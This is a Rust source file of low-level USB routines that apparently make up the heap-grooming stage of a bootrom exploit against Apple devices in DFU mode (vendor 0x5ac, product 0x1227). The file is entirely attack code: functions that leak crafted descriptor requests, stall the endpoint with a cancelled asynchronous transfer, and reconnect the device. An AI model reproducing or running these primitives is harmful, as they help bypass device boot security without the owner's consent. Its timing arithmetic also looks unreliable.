use std::{thread::sleep, time::{Duration, SystemTime, UNIX_EPOCH}};
use libusb1_sys::{libusb_fill_control_setup, libusb_fill_control_transfer, libusb_alloc_transfer, libusb_open_device_with_vid_pid, libusb_transfer, libusb_submit_transfer, libusb_cancel_transfer, libusb_control_transfer};
use rusb::{Context, UsbContext, DeviceHandle};

extern "system" fn _dummy(_: *mut libusb_transfer) {}

pub fn usb_req_leak() {
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), 0x5ac , 0x1227);
        let mut buf: [u8; 0x40] = [0; 0x40];
        libusb_control_transfer(han, 0x80 , 6, 0x304, 0x40A, buf.as_mut_ptr(), 0x40, 1);
    }
}

pub fn usb_no_leak() {
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), 0x5ac , 0x1227);
        let mut buffer_size: [u8; 0xc1] = [0; 0xc1];
        libusb_control_transfer(han, 0x80, 6, 0x304, 0x40A, buffer_size.as_mut_ptr(), 0xC1, 1);
    }
}

pub fn usb_stall() {
    let buffer_size: usize = 0xC0;
    let buf: Vec<u8> = vec![b'A'; buffer_size];
    async_ctrl_transfer( 0x80, 6, 0x304, 0x40A, &buf, 0xC0, 0.00001)
}

fn get_nanos() -> u64 {
    let start = SystemTime::now();
    let since_epoch = start.duration_since(UNIX_EPOCH).unwrap();
    since_epoch.as_secs() * 1_000_000_000 + since_epoch.subsec_nanos() as u64
}

fn async_ctrl_transfer(bm_request_type: u8, b_request: u8, w_value: u16, w_index: u16, data: &[u8], w_length: u16, timeout: f32) {
    let start = get_nanos();
    let mut buffer = vec![0; w_length as usize + 8];
    buffer[8..].copy_from_slice(data);
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), 0x5ac , 0x1227);
        libusb_fill_control_setup(buffer.as_mut_ptr(), bm_request_type, b_request, w_value, w_index, w_length);
        let transfer = libusb_alloc_transfer(0);
        libusb_fill_control_transfer(transfer, han, buffer.as_mut_ptr(), _dummy, std::ptr::null_mut(), 0);
        let _ret = libusb_submit_transfer(transfer);
        while get_nanos() as f32 - (start as f32) < (timeout * (10.0 * 6.0)) {}
        let _ret = libusb_cancel_transfer(transfer);
    }
}

pub fn reconnect_device(context: &Context, dev: &mut DeviceHandle<Context>, vid: u16, pid: u16, timer: Duration) -> Option<DeviceHandle<rusb::Context>> {
    println!("Reconnecting device...");
    dev.release_interface(0).expect("Unable to release device.");
    sleep(timer);
    return context.open_device_with_vid_pid(vid, pid)
}